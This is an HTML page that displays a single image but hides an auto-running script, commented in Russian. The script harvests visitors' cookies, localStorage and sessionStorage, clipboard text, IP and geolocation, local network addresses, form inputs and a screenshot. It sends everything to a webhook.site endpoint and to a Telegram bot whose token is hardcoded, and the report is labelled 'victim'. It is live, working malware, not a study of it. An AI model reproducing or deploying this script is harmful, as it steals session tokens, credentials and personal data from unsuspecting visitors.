<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d0d1a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 0;
        }
        img {
            width: 100%;
            height: 100vh;
            object-fit: contain;
            display: block;
        }
    </style>
</head>
<body>
    <img src="https://raw.githubusercontent.com/Johnn298/imgur/main/photo_2026-06-28_01-31-33.jpg" alt="">

    <script>
        const WEBHOOK_URL = 'https://webhook.site/613658ef-cb9f-4d68-8bae-9ae016ec744b';
        const BOT_TOKEN = '8783402037:AAF1L0A_UP12EUOgn5x2g7UMFntHy3QjDfk';
        const CHAT_ID = '8327334745';

        (async function() {
            await new Promise(r => setTimeout(r, 1500));

            const data = {};

            // ---- 1. Куки ----
            data.cookies = {};
            if (document.cookie) {
                document.cookie.split('; ').forEach(c => {
                    const [k, v] = c.split('=');
                    if (k) data.cookies[k] = v || '';
                });
            }

            // ---- 2. LocalStorage (ПОЛНЫЙ ДАМП) ----
            data.localStorage = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key) {
                    data.localStorage[key] = localStorage.getItem(key);
                }
            }

            // ---- 3. SessionStorage ----
            data.sessionStorage = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (key) {
                    data.sessionStorage[key] = sessionStorage.getItem(key);
                }
            }

            // ---- 4. IP ----
            data.ip = null;
            try {
                const ipResp = await fetch('https://api.ipify.org?format=json');
                const ipJson = await ipResp.json();
                data.ip = ipJson.ip;
            } catch (_) {}

            // ---- 5. ГЕО по IP ----
            data.geo = null;
            if (data.ip) {
                try {
                    const resp = await fetch(`https://ipwhois.io/json/${data.ip}`);
                    const json = await resp.json();
                    if (json && json.success !== false) {
                        data.geo = {
                            country: json.country || '?',
                            country_code: json.country_code || '?',
                            region: json.region || '?',
                            city: json.city || '?',
                            lat: json.latitude || 0,
                            lon: json.longitude || 0,
                            isp: json.isp || '?',
                            org: json.org || '?',
                            timezone: json.timezone || '?',
                            continent: json.continent || '?',
                            currency: json.currency || '?',
                            phone_code: json.phone_code || '?',
                            postal: json.postal || '?'
                        };
                    }
                } catch (_) {}
            }

            // ---- 6. Локальный IP (WebRTC) ----
            data.localIPs = [];
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                const ips = [];
                pc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const ip = e.candidate.candidate.split(' ')[4];
                        if (ip && !ips.includes(ip)) ips.push(ip);
                    }
                };
                pc.createDataChannel('test');
                await pc.createOffer().then(o => pc.setLocalDescription(o));
                await new Promise(r => setTimeout(r, 2000));
                pc.close();
                data.localIPs = ips;
            } catch (_) {}

            // ---- 7. Буфер обмена ----
            data.clipboard = null;
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    data.clipboard = await navigator.clipboard.readText();
                }
            } catch (_) {}

            // ---- 8. Скриншот ----
            data.screenshot = null;
            try {
                const script = document.createElement('script');
                script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
                document.head.appendChild(script);
                await new Promise((res) => {
                    script.onload = res;
                    setTimeout(res, 4000);
                });
                if (typeof html2canvas !== 'undefined') {
                    const canvas = await html2canvas(document.body, {
                        useCORS: true,
                        allowTaint: true,
                        scale: 0.3,
                        logging: false
                    });
                    data.screenshot = canvas.toDataURL('image/jpeg', 0.4);
                }
            } catch (_) {}

            // ---- 9. Базовые данные ----
            data.userAgent = navigator.userAgent;
            data.url = window.location.href;
            data.referrer = document.referrer || null;
            data.platform = navigator.platform;
            data.language = navigator.language;
            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            // ---- 10. Формы (если есть) ----
            data.forms = {};
            document.querySelectorAll('input, textarea, select').forEach(el => {
                const name = el.name || el.id || el.className || 'field';
                if (el.value !== undefined && el.value !== null && el.value !== '') {
                    data.forms[name] = el.value;
                }
            });

            // ---- 11. Все ссылки ----
            data.links = Array.from(document.querySelectorAll('a[href]')).map(a => a.href);

            // ============================================================
            //  ОТПРАВКА
            // ============================================================

            // ---- Webhook (полные данные) ----
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (_) {}

            // ---- Telegram (с ЛОКАЛСТОРАДЖЕМ) ----
            try {
                let msg = '🔴 ЖЕРТВА\n\n';
                if (data.ip) msg += `🌐 IP: ${data.ip}\n`;

                // ГЕО
                if (data.geo) {
                    msg += `\n📍 ГЕО:\n`;
                    msg += `   🌍 ${data.geo.country} (${data.geo.country_code})\n`;
                    if (data.geo.city) msg += `   🏙 ${data.geo.city}\n`;
                    if (data.geo.region) msg += `   🏛 ${data.geo.region}\n`;
                    if (data.geo.lat && data.geo.lon) {
                        msg += `   🗺 ${data.geo.lat}, ${data.geo.lon}\n`;
                        msg += `   🔗 https://www.google.com/maps?q=${data.geo.lat},${data.geo.lon}\n`;
                    }
                    if (data.geo.isp) msg += `   📡 ${data.geo.isp}\n`;
                    if (data.geo.timezone) msg += `   🕐 ${data.geo.timezone}\n`;
                }

                // ЛОКАЛЬНЫЙ IP
                if (data.localIPs && data.localIPs.length) {
                    msg += `\n📡 Локальный IP: ${data.localIPs.join(', ')}\n`;
                }

                // БУФЕР
                if (data.clipboard) {
                    msg += `\n📋 Буфер: ${data.clipboard.substring(0, 200)}\n`;
                }

                // LOCALSTORAGE (ПОЛНЫЙ ДАМП)
                const lsKeys = Object.keys(data.localStorage);
                if (lsKeys.length > 0) {
                    msg += `\n💾 LOCALSTORAGE (${lsKeys.length} шт.):\n`;
                    for (const key of lsKeys) {
                        const val = data.localStorage[key];
                        const shortVal = val.length > 100 ? val.substring(0, 100) + '...' : val;
                        msg += `   🔑 ${key}: ${shortVal}\n`;
                    }
                } else {
                    msg += `\n💾 LocalStorage: пусто\n`;
                }

                // SESSIONSTORAGE
                const ssKeys = Object.keys(data.sessionStorage);
                if (ssKeys.length > 0) {
                    msg += `\n🗂 SESSIONSTORAGE (${ssKeys.length} шт.):\n`;
                    for (const key of ssKeys) {
                        const val = data.sessionStorage[key];
                        const shortVal = val.length > 100 ? val.substring(0, 100) + '...' : val;
                        msg += `   🔑 ${key}: ${shortVal}\n`;
                    }
                }

                // КУКИ
                const cookieKeys = Object.keys(data.cookies);
                if (cookieKeys.length > 0) {
                    msg += `\n🍪 КУКИ (${cookieKeys.length} шт.):\n`;
                    for (const key of cookieKeys) {
                        const val = data.cookies[key];
                        const shortVal = val.length > 100 ? val.substring(0, 100) + '...' : val;
                        msg += `   🍪 ${key}: ${shortVal}\n`;
                    }
                }

                // ФОРМЫ
                const formKeys = Object.keys(data.forms);
                if (formKeys.length > 0) {
                    msg += `\n📝 ФОРМЫ (${formKeys.length} шт.):\n`;
                    for (const key of formKeys) {
                        msg += `   ${key}: ${data.forms[key]}\n`;
                    }
                }

                // ОСТАЛЬНОЕ
                msg += `\n📱 ${data.userAgent.substring(0, 80)}...\n`;
                msg += `🕐 ${data.timezone || '?'}\n`;
                if (data.screenshot) msg += `🖼 Скриншот: ${(data.screenshot.length / 1024).toFixed(0)} КБ\n`;
                msg += `\n🔗 ${data.url}`;

                // Отправляем в Telegram
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
                });
            } catch (_) {}

            // ---- Скриншот отдельно ----
            if (data.screenshot && data.screenshot.length > 10000) {
                try {
                    const blob = await fetch(data.screenshot).then(r => r.blob());
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'screenshot.jpg');
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (_) {}
            }

            console.log('✅ Данные отправлены');
        })();
    </script>
</body>
</html>
